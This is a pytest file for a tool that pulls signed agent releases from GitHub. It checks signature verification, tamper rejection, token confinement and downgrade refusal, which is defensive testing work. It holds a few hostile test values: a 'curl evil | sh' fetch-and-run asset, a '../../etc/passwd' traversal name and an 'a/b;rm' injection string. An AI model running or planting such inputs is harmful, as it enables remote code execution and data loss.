"""
test_agent_release_pull.py — `agent_release.py pull`: GitHub Release -> the manager's store.

A local server plays GitHub (release JSON + assets, with the asset download redirected to a
second "object storage" host the way GitHub does). What matters:

  * an honest release lands in the store, is made current, and the MANAGER'S OWN loader
    accepts it (the tool and the manager must agree on what a valid release is);
  * nothing at all reaches the store unless both signatures verify against the pinned keys
    and every file matches its signed hash — tampered asset, wrong key, missing asset,
    a manifest whose version disagrees with the tag, an unsafe file name;
  * the GitHub token never goes to the storage host; a downgrade redirect is refused;
  * only files the signed manifest lists are taken (extra assets on the release are ignored);
  * releases are immutable and re-pulling is idempotent.
"""
from __future__ import annotations

import importlib.util
import json
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from app import agent_release

REPO_ROOT = Path(__file__).resolve().parents[3]
_spec = importlib.util.spec_from_file_location("agent_release_tool", REPO_ROOT / "scripts" / "agent_release.py")
tool = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(tool)

TOKEN = "ghp_test_token"
SLUG = "acme/vedha"


class FakeGitHub:
    """GitHub's REST surface for releases + a separate host that serves the asset bytes."""

    def __init__(self):
        self.releases: list[dict] = []           # newest first
        self.files: dict[int, bytes] = {}
        self.api_auth: list[str | None] = []
        self.storage_auth: list[str | None] = []
        self.downgrade_to: str | None = None
        gh = self

        class Storage(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def do_GET(self):
                gh.storage_auth.append(self.headers.get("Authorization"))
                aid = int(self.path.rsplit("/", 1)[1])
                body = gh.files[aid]
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        class Api(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _json(self, obj, status=200):
                body = json.dumps(obj).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            def do_GET(self):
                gh.api_auth.append(self.headers.get("Authorization"))
                path = urllib.parse.urlsplit(self.path).path
                base = f"/repos/{SLUG}/releases"
                if path == base:
                    return self._json(gh.releases)
                if path.startswith(base + "/tags/"):
                    tag = urllib.parse.unquote(path[len(base + "/tags/"):])
                    for r in gh.releases:
                        if r["tag_name"] == tag:
                            return self._json(r)
                    return self._json({"message": "Not Found"}, 404)
                if path.startswith("/assets/"):
                    target = gh.downgrade_to or f"http://127.0.0.1:{gh.storage.server_address[1]}/blob/{path.rsplit('/', 1)[1]}"
                    self.send_response(302)
                    self.send_header("Location", target)
                    self.end_headers()
                    return
                self._json({"message": "Not Found"}, 404)

        self.storage = ThreadingHTTPServer(("127.0.0.1", 0), Storage)
        self.api = ThreadingHTTPServer(("127.0.0.1", 0), Api)
        for s in (self.storage, self.api):
            threading.Thread(target=s.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.api.server_address[1]}"
        self._next_id = 1

    def stop(self):
        self.api.shutdown()
        self.storage.shutdown()

    def publish(self, release_dir: Path, *, tag=None, draft=False, prerelease=False, only=None, tamper=None,
                extra: dict[str, bytes] | None = None):
        assets = []
        files = {f.name: f.read_bytes() for f in release_dir.iterdir() if f.is_file()}
        files.update(extra or {})
        for name, data in files.items():
            if only is not None and name not in only:
                continue
            if tamper and name == tamper[0]:
                data = tamper[1](data)
            aid, self._next_id = self._next_id, self._next_id + 1
            self.files[aid] = data
            assets.append({"name": name, "url": f"{self.url}/assets/{aid}", "size": len(data), "state": "uploaded"})
        release = {"tag_name": tag or f"agent-v{release_dir.name}", "draft": draft, "prerelease": prerelease,
                   "assets": assets}
        self.releases.insert(0, release)
        return release


@pytest.fixture
def gh():
    server = FakeGitHub()
    yield server
    server.stop()


@pytest.fixture(scope="module")
def built(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("built")
    tool.keygen(tmp / "ed.pem")
    spki = tool.keygen_p256(tmp / "p256.pem")
    ed_pub = tool.public_raw_b64(tool.load_private_key(tmp / "ed.pem"))
    win = tmp / "win.zip"
    win.write_bytes(b"PK\x03\x04 pretend windows package" * 100)
    sbom = tmp / "sbom.json"
    sbom.write_text('{"bomFormat": "CycloneDX"}')
    ps = tmp / "install-remote.ps1"
    ps.write_bytes(b"$script:VedhaReleaseP256Spki = ''\n$script:VedhaReleaseVersion = ''\n")
    cmd = tmp / "install-remote.cmd"
    cmd.write_bytes(b"@echo off\r\n")

    cache = {}

    def make(version):
        if version not in cache:
            cache[version] = _build(version)
        return cache[version]

    def _build(version):
        return tool.build_release(
            key_path=tmp / "ed.pem", out=tmp / f"out-{version}", arches=["amd64", "arm64"], version=version,
            builder=lambda *a: None, saver=lambda tag, dest: dest.write_bytes(f"image {tag}".encode() * 30),
            p256_key_path=tmp / "p256.pem", windows_zip=win, sbom_path=sbom,
            windows_installer_source=ps, windows_launcher_source=cmd)
    return {"make": make, "ed_pub": ed_pub, "p256": spki, "tmp": tmp}


def _pull(gh, store, built, **kw):
    kw.setdefault("token", TOKEN)
    return tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
                     api_url=gh.url, log=lambda *_: None, **kw)


def _flip(data: bytes) -> bytes:
    out = bytearray(data)
    out[len(out) // 2] ^= 1
    return bytes(out)


def _store_is_empty(store: Path) -> bool:
    return not store.exists() or not [p for p in store.iterdir()]


# ── the happy path ───────────────────────────────────────────────────────────

def test_pull_installs_a_release_the_manager_accepts(gh, built, tmp_path):
    release = built["make"]("1.0.1")
    gh.publish(release)
    store = tmp_path / "store"
    target = _pull(gh, store, built)
    assert target == store / "1.0.1"
    assert (store / "CURRENT").read_text().strip() == "1.0.1"
    # the manager's own loader (independent of the tool) serves it, Windows package included
    loaded = agent_release.load_release(store, public_key_b64=built["ed_pub"],
                                        p256_public_key_b64=built["p256"])
    assert loaded.version == "1.0.1" and loaded.windows_available
    assert {f.name for f in (store / "1.0.1").iterdir()} == {f.name for f in release.iterdir()}


def test_without_a_tag_the_newest_published_agent_release_wins(gh, built, tmp_path):
    gh.publish(built["make"]("1.0.1"))
    newest = built["make"]("1.0.2")
    gh.publish(newest)
    gh.publish(built["make"]("1.0.3"), draft=True)                    # unpublished
    gh.publish(built["make"]("1.0.4"), prerelease=True)               # not a release
    gh.releases.insert(0, {"tag_name": "v9.9.9", "assets": []})       # some other product's tag
    assert _pull(gh, tmp_path / "s", built) == tmp_path / "s" / "1.0.2"


def test_an_explicit_tag_pulls_that_release_and_warns_on_rollback(gh, built, tmp_path):
    gh.publish(built["make"]("1.0.5"))
    gh.publish(built["make"]("1.0.6"))
    store, logs = tmp_path / "s", []
    tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
              tag="agent-v1.0.6", api_url=gh.url, token=TOKEN, log=logs.append)
    tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
              tag="agent-v1.0.5", api_url=gh.url, token=TOKEN, log=logs.append)
    assert (store / "CURRENT").read_text().strip() == "1.0.5"
    assert any("ROLLS BACK" in line for line in logs)


def test_no_current_installs_without_switching(gh, built, tmp_path):
    gh.publish(built["make"]("1.0.7"))
    store = tmp_path / "s"
    _pull(gh, store, built)
    gh.publish(built["make"]("1.0.8"))
    _pull(gh, store, built, make_current=False)
    assert (store / "1.0.8").is_dir() and (store / "CURRENT").read_text().strip() == "1.0.7"


def test_repulling_is_idempotent_and_releases_are_immutable(gh, built, tmp_path):
    release = built["make"]("1.0.9")
    gh.publish(release)
    store = tmp_path / "s"
    _pull(gh, store, built)
    _pull(gh, store, built)                                           # same content: fine
    (store / "1.0.9" / "manifest.json").write_bytes(b"{}")            # the store drifted
    with pytest.raises(tool.ReleaseError, match="immutable"):
        _pull(gh, store, built)


def test_only_files_the_signed_manifest_lists_are_taken(gh, built, tmp_path):
    release = built["make"]("1.1.0")
    gh.publish(release, extra={"surprise.sh": b"curl evil | sh", "notes.md": b"hi"})
    store = tmp_path / "s"
    _pull(gh, store, built)
    names = {f.name for f in (store / "1.1.0").iterdir()}
    assert "surprise.sh" not in names and "notes.md" not in names


# ── nothing reaches the store unless everything verifies ─────────────────────

@pytest.mark.parametrize("asset", ["manifest.json", "install.sh", "install.ps1", "install.cmd", "sbom.cdx.json",
                                   "vedha-agent-1.2.0-amd64.tar.gz", "vedha-agent-1.2.0-windows-amd64.zip"])
def test_a_tampered_asset_installs_nothing(gh, built, tmp_path, asset):
    gh.publish(built["make"]("1.2.0"), tamper=(asset, _flip))
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError):
        _pull(gh, store, built)
    assert _store_is_empty(store)


@pytest.mark.parametrize("asset", ["manifest.json.sig", "manifest.json.p256.sig"])
def test_a_tampered_signature_installs_nothing(gh, built, tmp_path, asset):
    import base64
    def corrupt(data: bytes) -> bytes:
        raw = bytearray(base64.b64decode(data.strip()))
        raw[0] ^= 1
        return base64.b64encode(bytes(raw)) + b"\n"
    gh.publish(built["make"]("1.2.1"), tamper=(asset, corrupt))
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError, match="signature"):
        _pull(gh, store, built)
    assert _store_is_empty(store)


def test_a_release_signed_by_another_key_is_refused(gh, built, tmp_path):
    gh.publish(built["make"]("1.2.2"))
    other = tmp_path / "other.pem"
    tool.keygen(other)
    wrong = tool.public_raw_b64(tool.load_private_key(other))
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError, match="signature"):
        tool.pull(repo=SLUG, dest=store, public_key_b64=wrong, p256_public_key_b64=built["p256"],
                  api_url=gh.url, log=lambda *_: None)
    assert _store_is_empty(store)


def test_a_wrong_p256_key_is_refused(gh, built, tmp_path):
    gh.publish(built["make"]("1.2.3"))
    other = tmp_path / "p.pem"
    wrong = tool.keygen_p256(other)
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError, match="P-256"):
        tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=wrong,
                  api_url=gh.url, log=lambda *_: None)
    assert _store_is_empty(store)


def test_a_windows_release_cannot_be_pulled_without_the_p256_key(gh, built, tmp_path):
    gh.publish(built["make"]("1.2.4"))
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError, match="P-256"):
        tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], api_url=gh.url, log=lambda *_: None)
    assert _store_is_empty(store)


def test_a_missing_asset_is_refused(gh, built, tmp_path):
    release = built["make"]("1.2.5")
    gh.publish(release, only={f.name for f in release.iterdir()} - {"install.sh"})
    with pytest.raises(tool.ReleaseError, match="missing install.sh"):
        _pull(gh, tmp_path / "s", built)


def test_a_release_without_a_manifest_is_not_an_agent_release(gh, built, tmp_path):
    gh.publish(built["make"]("1.2.6"), only={"install.sh"})
    with pytest.raises(tool.ReleaseError, match="not a signed agent release"):
        _pull(gh, tmp_path / "s", built)


def test_a_manifest_that_disagrees_with_the_tag_is_refused(gh, built, tmp_path):
    """Re-labelling an old (validly signed) release as a newer tag is a downgrade attack."""
    gh.publish(built["make"]("1.2.7"), tag="agent-v1.9.9")
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError, match="tag says"):
        _pull(gh, store, built)
    assert _store_is_empty(store)


def test_an_unsafe_file_name_in_a_signed_manifest_is_refused():
    with pytest.raises(tool.ReleaseError, match="unsafe"):
        tool.manifest_file_names({"installer": {"file": "../../etc/passwd"}})
    with pytest.raises(tool.ReleaseError, match="unsafe"):
        tool.manifest_file_names({"installer": {"file": "install.sh"}, "images": [{"file": ".hidden"}]})


def test_a_manifest_signature_is_checked_before_the_big_files_are_fetched(gh, built, tmp_path):
    release = built["make"]("1.2.8")
    gh.publish(release, tamper=("manifest.json", _flip))
    fetched_before = len(gh.storage_auth)
    with pytest.raises(tool.ReleaseError, match="signature"):
        _pull(gh, tmp_path / "s", built)
    assert len(gh.storage_auth) - fetched_before == 3          # manifest + two signatures only, no images


# ── the token ────────────────────────────────────────────────────────────────

def test_the_token_goes_to_github_and_never_to_the_storage_host(gh, built, tmp_path):
    gh.publish(built["make"]("1.3.0"))
    _pull(gh, tmp_path / "s", built)
    assert gh.api_auth and all(a == f"Bearer {TOKEN}" for a in gh.api_auth)
    assert gh.storage_auth and all(a is None for a in gh.storage_auth)


def test_no_token_is_sent_when_none_is_given(gh, built, tmp_path):
    gh.publish(built["make"]("1.3.1"))
    _pull(gh, tmp_path / "s", built, token=None)
    assert all(a is None for a in gh.api_auth)


def test_a_redirect_that_downgrades_from_https_is_refused():
    handler = tool._KeepTokenOnItsHost()
    req = tool.urllib.request.Request("https://api.github.com/repos/o/r/releases/assets/1")
    with pytest.raises(tool.ReleaseError, match="https to http"):
        handler.redirect_request(req, None, 302, "Found", {}, "http://objects.example/blob")


def test_the_token_is_dropped_on_a_cross_host_redirect_and_kept_on_the_same_host():
    handler = tool._KeepTokenOnItsHost()
    req = tool.urllib.request.Request("https://api.github.com/a", headers={"Authorization": "Bearer t"})
    cross = handler.redirect_request(req, None, 302, "Found", {}, "https://objects.example/blob")
    same = handler.redirect_request(req, None, 301, "Moved", {}, "https://api.github.com/b")
    assert cross.get_header("Authorization") is None
    assert same.get_header("Authorization") == "Bearer t"


# ── input handling ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("bad", ["", "noslash", "a/b/c", "a b/c", "../x", "a/..", "a/.", "a/b;rm", "-a/b"])
def test_repo_must_be_owner_slash_name(bad, tmp_path):
    with pytest.raises(tool.ReleaseError, match="OWNER/REPO"):
        tool.pull(repo=bad, dest=tmp_path, public_key_b64="x", log=lambda *_: None)


def test_unknown_release_is_a_clear_error(gh, built, tmp_path):
    with pytest.raises(tool.ReleaseError, match="404"):
        _pull(gh, tmp_path / "s", built, tag="agent-v0.0.0")
    with pytest.raises(tool.ReleaseError, match="no published release"):
        _pull(gh, tmp_path / "s2", built)


def test_tag_must_look_like_an_agent_tag(gh, built, tmp_path):
    with pytest.raises(tool.ReleaseError, match="agent-v"):
        _pull(gh, tmp_path / "s", built, tag="v1.0.0")


def test_env_file_supplies_the_pinned_keys(tmp_path):
    env = tmp_path / ".env"
    env.write_text('# manager env\nAGENT_RELEASE_PUBLIC_KEY="abc="\nOTHER=1\nAGENT_RELEASE_P256_PUBLIC_KEY=def=\n')
    values = tool.read_env_file(env)
    assert values["AGENT_RELEASE_PUBLIC_KEY"] == "abc=" and values["AGENT_RELEASE_P256_PUBLIC_KEY"] == "def="


def test_cli_pull_end_to_end(gh, built, tmp_path, monkeypatch, capsys):
    gh.publish(built["make"]("1.4.0"))
    store = tmp_path / "s"
    env = tmp_path / ".env"
    env.write_text(f"AGENT_RELEASE_PUBLIC_KEY={built['ed_pub']}\nAGENT_RELEASE_P256_PUBLIC_KEY={built['p256']}\n")
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    assert tool.main(["pull", "--repo", SLUG, "--to", str(store), "--env-file", str(env), "--api-url", gh.url]) == 0
    assert (store / "CURRENT").read_text().strip() == "1.4.0"
    assert "now the release the manager serves" in capsys.readouterr().out
    assert tool.main(["pull", "--repo", SLUG, "--to", str(store), "--api-url", gh.url,
                      "--public-key", built["ed_pub"]]) == 1             # Windows release, no P-256 key


# ── sync: the manager keeps itself up to date (`pull --only-if-newer` and `watch`) ─────────────

def _sync(gh, store, built, **kw):
    kw.setdefault("token", TOKEN)
    return tool.pull(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
                     api_url=gh.url, log=lambda *_: None, only_if_newer=True, **kw)


def test_a_poll_installs_the_newest_release_then_does_nothing_and_downloads_nothing(gh, built, tmp_path):
    gh.publish(built["make"]("2.0.1"))
    store = tmp_path / "s"
    assert _sync(gh, store, built) == store / "2.0.1"
    assert (store / "CURRENT").read_text().strip() == "2.0.1"
    storage_hits = len(gh.storage_auth)
    assert _sync(gh, store, built) == store / "2.0.1"                  # already installed
    # a repeat poll fetched only the small manifest files, never the images or the Windows package
    assert len(gh.storage_auth) - storage_hits <= 3


def test_a_poll_never_rolls_back_the_served_release(gh, built, tmp_path):
    gh.publish(built["make"]("2.0.2"))
    store = tmp_path / "s"
    _sync(gh, store, built)
    gh.releases.clear()
    gh.publish(built["make"]("2.0.1"))                                  # GitHub's newest is now OLDER than the one served
    assert _sync(gh, store, built) is None
    assert (store / "CURRENT").read_text().strip() == "2.0.2" and not (store / "2.0.1").exists()


def test_a_newer_release_is_picked_up_and_served_by_itself(gh, built, tmp_path):
    gh.publish(built["make"]("2.0.3"))
    store = tmp_path / "s"
    _sync(gh, store, built)
    gh.publish(built["make"]("2.0.4"))
    assert _sync(gh, store, built) == store / "2.0.4"
    assert (store / "CURRENT").read_text().strip() == "2.0.4" and (store / "2.0.3").is_dir()   # the old one is kept


def test_with_no_current_a_poll_installs_but_does_not_serve_and_does_not_redownload(gh, built, tmp_path):
    gh.publish(built["make"]("2.0.5"))
    store = tmp_path / "s"
    _sync(gh, store, built)
    gh.publish(built["make"]("2.0.6"))
    _sync(gh, store, built, make_current=False)
    assert (store / "2.0.6").is_dir() and (store / "CURRENT").read_text().strip() == "2.0.5"
    _sync(gh, store, built, make_current=False)                         # repeat: still not served
    assert (store / "CURRENT").read_text().strip() == "2.0.5"
    _sync(gh, store, built)                                             # the owner turned promotion on: it is promoted
    assert (store / "CURRENT").read_text().strip() == "2.0.6"


def test_a_poll_with_a_tampered_release_installs_nothing_and_raises(gh, built, tmp_path):
    gh.publish(built["make"]("2.0.7"), tamper=("install.ps1", _flip))
    store = tmp_path / "s"
    with pytest.raises(tool.ReleaseError):
        _sync(gh, store, built)
    assert _store_is_empty(store)


def _watch(gh, store, built, **kw):
    logs: list[str] = []
    kw.setdefault("token", TOKEN)
    kw.setdefault("once", True)
    tool.watch(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
               api_url=gh.url, log=logs.append, sleep=lambda s: None, **kw)
    return logs


def test_watch_once_installs_and_serves_the_newest_release(gh, built, tmp_path):
    gh.publish(built["make"]("2.1.0"))
    store = tmp_path / "s"
    _watch(gh, store, built)
    loaded = agent_release.load_release(store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"])
    assert loaded.version == "2.1.0" and loaded.windows_available


def test_a_pause_file_holds_it_still_without_touching_the_network(gh, built, tmp_path):
    gh.publish(built["make"]("2.1.1"))
    store = tmp_path / "s"
    store.mkdir()
    (store / tool.PAUSE_FILE).write_text("")
    logs = _watch(gh, store, built)
    assert any("paused" in line for line in logs)
    assert gh.api_auth == [] and not (store / "2.1.1").exists()
    (store / tool.PAUSE_FILE).unlink()
    _watch(gh, store, built)                                            # resumed
    assert (store / "CURRENT").read_text().strip() == "2.1.1"


def test_watch_survives_failures_backs_off_and_recovers(gh, built, tmp_path):
    store = tmp_path / "s"
    calls, sleeps, logs = [], [], []

    def flaky(**kw):
        calls.append(kw["only_if_newer"])
        if len(calls) < 4:
            raise tool.ReleaseError("GitHub is down")
        raise KeyboardInterrupt                                         # stop the otherwise endless loop in the test

    with pytest.raises(KeyboardInterrupt):
        tool.watch(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], interval_seconds=60,
                   sleep=sleeps.append, log=logs.append, pull_fn=flaky)
    assert calls == [True, True, True, True]                            # always the safe mode: never a rollback
    assert sleeps == [120, 240, 480]                                    # the delay doubles after each failure
    assert sum("release sync failed" in line for line in logs) == 3


def test_the_backoff_is_capped_at_an_hour(gh, built, tmp_path):
    sleeps: list[float] = []
    n = {"i": 0}

    def always_fails(**kw):
        n["i"] += 1
        if n["i"] > 12:
            raise KeyboardInterrupt
        raise tool.ReleaseError("down")

    with pytest.raises(KeyboardInterrupt):
        tool.watch(repo=SLUG, dest=tmp_path / "s", public_key_b64=built["ed_pub"], interval_seconds=900,
                   sleep=sleeps.append, log=lambda *_: None, pull_fn=always_fails)
    assert max(sleeps) == 3600


def test_a_bad_release_is_logged_every_time_and_never_installed(gh, built, tmp_path):
    gh.publish(built["make"]("2.1.2"), tamper=("manifest.json", _flip))
    store = tmp_path / "s"
    sleeps: list[float] = []
    n = {"i": 0}

    def sleeper(seconds):
        n["i"] += 1
        sleeps.append(seconds)
        if n["i"] >= 2:
            raise KeyboardInterrupt

    out: list[str] = []
    with pytest.raises(KeyboardInterrupt):
        tool.watch(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], p256_public_key_b64=built["p256"],
                   api_url=gh.url, token=TOKEN, interval_seconds=60, sleep=sleeper, log=out.append)
    assert sum("release sync failed" in line for line in out) == 2
    assert _store_is_empty(store)


def test_watch_once_exits_non_zero_when_it_could_not_complete(gh, built, tmp_path):
    store = tmp_path / "s"                                              # GitHub has no agent release at all
    with pytest.raises(tool.ReleaseError, match="did not complete"):
        _watch(gh, store, built)


def test_a_read_only_release_folder_says_exactly_how_to_fix_it(gh, built, tmp_path, monkeypatch):
    store = tmp_path / "s"
    store.mkdir()
    monkeypatch.setattr(tool.os, "access", lambda *a, **k: False)
    gh.publish(built["make"]("2.1.3"))
    out: list[str] = []
    with pytest.raises(tool.ReleaseError):
        tool.watch(repo=SLUG, dest=store, public_key_b64=built["ed_pub"], once=True, log=out.append,
                   sleep=lambda s: None, api_url=gh.url)
    assert any("not writable" in line and "chown" in line for line in out)
    assert not (store / "2.1.3").exists()


def test_the_cli_watch_reads_the_repo_and_keys_from_the_environment(gh, built, tmp_path, monkeypatch, capsys):
    gh.publish(built["make"]("2.1.4"))
    store = tmp_path / "s"
    monkeypatch.setenv("AGENT_RELEASE_GITHUB_REPO", SLUG)
    monkeypatch.setenv("AGENT_RELEASE_PUBLIC_KEY", built["ed_pub"])
    monkeypatch.setenv("AGENT_RELEASE_P256_PUBLIC_KEY", built["p256"])
    monkeypatch.setenv("AGENT_RELEASE_GITHUB_TOKEN", TOKEN)
    assert tool.main(["watch", "--once", "--to", str(store), "--api-url", gh.url]) == 0
    out = capsys.readouterr().out
    assert "watching acme/vedha every 15 min" in out and "authenticated" in out
    assert TOKEN not in out                                              # the token is never printed
    assert (store / "CURRENT").read_text().strip() == "2.1.4"


def test_the_cli_watch_clamps_the_interval_and_needs_a_repo_and_a_key(gh, built, tmp_path, monkeypatch, capsys):
    monkeypatch.delenv("AGENT_RELEASE_GITHUB_REPO", raising=False)
    monkeypatch.delenv("AGENT_RELEASE_PUBLIC_KEY", raising=False)
    assert tool.main(["watch", "--once", "--to", str(tmp_path / "s")]) == 1
    assert "no GitHub repository" in capsys.readouterr().err
    monkeypatch.setenv("AGENT_RELEASE_GITHUB_REPO", SLUG)
    assert tool.main(["watch", "--once", "--to", str(tmp_path / "s")]) == 1
    assert "no release public key" in capsys.readouterr().err
    monkeypatch.setenv("AGENT_RELEASE_PUBLIC_KEY", built["ed_pub"])
    gh.publish(built["make"]("2.1.5"))
    tool.main(["watch", "--once", "--interval-minutes", "1", "--to", str(tmp_path / "s"), "--api-url", gh.url])
    assert "every 5 min" in capsys.readouterr().out                      # 1 is raised to the 5-minute floor


def test_the_copy_inside_the_backend_image_is_the_same_file():
    """Production hosts only get manager/ (sparse clone), so the sync service runs the tool from the
    backend image. The copy must never drift from the canonical scripts/agent_release.py."""
    canonical = (REPO_ROOT / "scripts" / "agent_release.py").read_bytes()
    assert (REPO_ROOT / "manager" / "backend" / "scripts" / "agent_release.py").read_bytes() == canonical
